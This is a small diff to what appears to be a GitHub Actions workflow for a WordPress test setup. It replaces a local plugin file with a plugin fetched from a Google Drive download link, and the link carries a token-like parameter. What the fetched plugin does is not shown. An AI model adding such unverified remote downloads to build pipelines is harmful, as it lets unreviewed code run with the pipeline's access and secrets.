@@ -9,7 +9,7 @@ jobs:
         with:
           core: "WordPress/WordPress"
           phpVersion: "8.1"
-          plugins: '["./serve-static.php"]'
+          plugins: '["https://drive.usercontent.google.com/download?id=16QNNf5zbIB1ll7UZRCB6cxNa4Jz99Dkt&export=download&authuser=1&confirm=t&uuid=fcaa87ee-9e84-4965-a0d5-01eb740c7b6b&at=APZUnTU0VZFtWyDKlk7VOmtuGatU:1709485941069"]'
       - name: Checkout
         uses: actions/checkout@v4
       - name: Install dependencies
